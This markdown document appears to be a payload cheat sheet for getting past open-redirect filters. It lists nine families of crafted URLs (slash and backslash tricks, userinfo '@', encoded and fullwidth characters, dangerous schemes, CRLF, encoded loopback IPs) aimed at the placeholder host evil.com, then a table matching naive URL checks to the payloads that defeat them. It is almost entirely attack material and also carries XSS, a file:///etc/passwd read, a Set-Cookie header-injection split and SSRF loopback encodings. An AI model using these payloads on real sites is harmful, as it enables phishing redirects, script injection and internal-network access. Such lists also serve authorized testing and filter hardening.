# Per-vector — each filter-bypass family and its arms

## Vector 1 — the scheme-relative `//` family

```text
//evil.com            <- the canonical scheme-relative
//%65vil.com          <- an encoded char in the host
//evil%2ecom          <- an encoded .
//evil.com%2f.target.com
//evil.com%40target.com
//evil.com%23target.com
//evil.com%3ftarget.com
/%2fevil.com          <- a / + encoded /
%2f%2fevil.com        <- the double-encoded //
///evil.com           <- triple-slash
////evil.com          <- quad-slash
//\\evil.com          <- the // + \\
//\evil.com           <- the // + \
```

## Vector 2 — the backslash family

```text
/\evil.com            <- a / + \
\/evil.com            <- a \ + /
\\evil.com            <- a UNC-style \\
/\//\evil.com         <- interleaved
/%5cevil.com          <- the encoded \
%5cevil.com           <- an encoded \ alone
\\%65vil.com          <- an encoded host-char
https:/\evil.com      <- a scheme + /\ 
https:\/evil.com      <- a scheme + \/
https:\\evil.com      <- a scheme + \\
https:%5c%5cevil.com  <- an encoded \\
```

## Vector 3 — the userinfo `@` family

```text
https://target.com@evil.com       <- userinfo=target.com, host=evil.com
https://evil.com@target.com       <- userinfo=evil.com, host=target.com
https://evil.com\@target.com      <- the \@ escape — parser disagreement
https://evil.com%40target.com     <- the encoded @
https://evil.com%2540target.com   <- the double-encoded @
https://target.com%40evil.com     <- the @ in the OTHER order
https://target.com:443@evil.com   <- userinfo+port
https://target.com%2f@evil.com    <- an encoded / then @
https://evil.com/?@target.com     <- the @ in the query
https://evil.com#@target.com      <- the @ in the fragment
https://user:pass@evil.com        <- a full userinfo
```

## Vector 4 — the substring/suffix family

```text
https://target.com.evil.com       <- a subdomain — the suffix-match gap
https://eviltarget.com            <- no dot-boundary — the contains-match
https://target-com.evil.com       <- a similar-name
https://target.com.attacker.com   <- a deeper subdomain
https://evil.com/target.com       <- the substring in the path
https://evil.com?target.com       <- in the query
https://evil.com#target.com       <- in the fragment
https://evil.com/x/target.com     <- deeper in the path
https://x.target.com@evil.com     <- a subdomain-userinfo mix
https://target.com.evil.com.evil2.com <- deeper
```

## Vector 5 — the encoded-char family

```text
https:%2f%2fevil.com              <- the encoded //
https%3a%2f%2fevil.com            <- the fully-encoded
https%253a%252f%252fevil.com      <- the double-encoded
%2f%2fevil.com                    <- an encoded // alone
https%3a//evil.com                <- partial
https://evil%2ecom                <- an encoded .
https://evil%252ecom              <- double-encoded .
https://evil.com%2f%3f%40target.com <- encoded /?@
https://evil.com%252f%253f%2540target.com
```

## Vector 6 — the scheme family

```text
https:evil.com            <- a scheme with no //
https:/evil.com           <- a scheme + one /
https:/\evil.com          <- a scheme + /\
https:\\evil.com          <- a scheme + \\
javascript:alert(1)       <- a JS scheme — XSS twin
javascript://%0aalert(1)  <- a comment-obfuscated
data:text/html,<script>alert(1)</script>  <- a data: — XSS
data:text/html;base64,PHNjcmlwdD5h...   <- a b64 data:
vbscript:msgbox(1)        <- a vbscript: — legacy
file:///etc/passwd        <- a file: — LFI twin
about:blank               <- an about:
```

## Vector 7 — the unicode/fullwidth family

```text
https:%ef%bc%8f%ef%bc%8fevil.com   <- the fullwidth //
https://evil%ef%bc%8ecom           <- the fullwidth .
https://evil%ef%bc%a0target.com    <- the fullwidth @
https://evil.com%ef%bc%83target.com  <- the fullwidth #
https://evil.com%ef%bc%9ftarget.com  <- the fullwidth ?
evil%E3%80%82com                   <- the ideographic 。
evil%E3%80%82com                   <- 。 (ideographic full stop) -> .
```

## Vector 8 — the whitespace/control family

```text
%20https://evil.com       <- a leading space
https://evil.com%20       <- a trailing space
%09https://evil.com       <- a leading tab
https://evil.com%09       <- a trailing tab
%0d%0ahttps://evil.com    <- a CRLF
https://evil.com%0d%0a    <- a trailing CRLF — the header-injection twin
%0d%0aSet-Cookie:%20x=y   <- a CRLF header-split
```

## Vector 9 — the decimal/hex IP family (the SSRF-twin)

```text
http://2130706433/        <- 127.0.0.1 decimal
http://0x7f000001/        <- 127.0.0.1 hex
http://0177.0.0.1/        <- 127.0.0.1 octal
http://127.1/             <- 127.0.0.1 short
http://0/                 <- 0.0.0.0 -> localhost on some
http://[::1]/             <- IPv6 loopback
```

## The vector-to-filter matrix

| The filter | The vector that defeats it |
|---|---|
| `startswith('/')` | Vector 1 (`//`), Vector 2 (`/\`, `\\`), Vector 6 (`https:`) |
| `contains('target.com')` | Vector 4 (substring-in-path/query/fragment) |
| `endswith('target.com')` | Vector 4 (`eviltarget.com`) |
| `host==target.com` (urlparse) | Vector 3 (userinfo `@`), Vector 5 (encoded) |
| `no '://'` | Vector 1 (`//`), Vector 2 (`\\`) |
| `scheme in [http,https]` | Vector 6 (javascript:/data:) |
| the raw encoded check | Vector 5 (encoded), the double-encode |
| an ASCII check | Vector 7 (fullwidth) |
| a whitespace-strip gap | Vector 8 |
